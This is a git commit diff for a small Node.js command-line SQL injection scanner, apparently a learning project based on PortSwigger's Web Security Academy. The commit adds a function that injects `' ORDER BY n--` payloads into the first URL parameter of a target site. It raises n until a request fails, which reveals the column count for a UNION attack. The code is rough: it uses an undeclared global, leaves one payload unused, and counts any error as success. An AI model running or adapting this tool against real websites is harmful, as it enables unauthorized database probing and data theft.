268f8e9854eb58fba0963b1a9b0e0a3068447541
Ashaun Thomas <ashaunthomas@siu.edu>
2022-07-15 16:34:13 -0700

    adds column union attack logic; updates readme

--- README.md
+++ README.md
@@ -2,3 +2,8 @@
 A CLI tool to search for SQL injection opportunities in the ways detailed on PortSwigger (https://portswigger.net/web-security/sql-injection)
 
 ![Cats :3](resources/hqdefault.jpeg)
+
+
+# How to use
+1. Set `setopt noglob` to allow query URLs as the CLI arguments
+2. Run `chmod u+x index.js`
--- index.js
+++ index.js
@@ -1,24 +1,55 @@
+#!/usr/bin/node
+
+
 /**
  * Step 1: Get input URL from CLI
  */
-
 const axios = require('axios');
 const injectionSyntax = /=\w*/;
 const ERRORS_HANDLED = {
     "ECONNREFUSED": "This website can't be connected to. Is this the right address?"
 }
+const target = process.argv[2];
 
-let target = process.argv[2];
-console.log(target);
+let columnNum = 1;
+
+function columnCheck(url, injectionPoint) {
+    console.log('initializing column union attack check...');
+    let successful = false;
+    let target = url.substring(0, injectionPoint);
+    let attacks = {
+        'standard': `' ORDER BY ${columnNum}--`,
+        'mysql': "' ORDER BY 1-- "
+    }
+
+    attackTarget = target +  encodeURI(attacks.standard);
+
+    // TODO: cycle through different attack methods for checking columns
+    axios.get(attackTarget).then(res => {
+        columnNum++;
+        console.log('inceased column check to ' + columnNum);
+    })
+    .catch(error => {
+        console.log(`found ${columnNum - 1} columns in database query!`);
+        successful = true;
+    })
+    .finally( _ => {
+        if (!successful) {
+            columnCheck(url, injectionPoint);
+        }
+    })
+}
+
 
 axios
 .get(target)
 .then(res => {
     if (res.status === 200) {
-        //console.log(res);
         let url = res.config.url;
         let injectionPoint = url.search(injectionSyntax) + 1;
-        console.log(url.substring(injectionPoint));
+        //console.log(url.substring(injectionPoint));
+        columnCheck(url, injectionPoint);
+
     }
     //console.log(`statusCode: ${res.status}`);
     
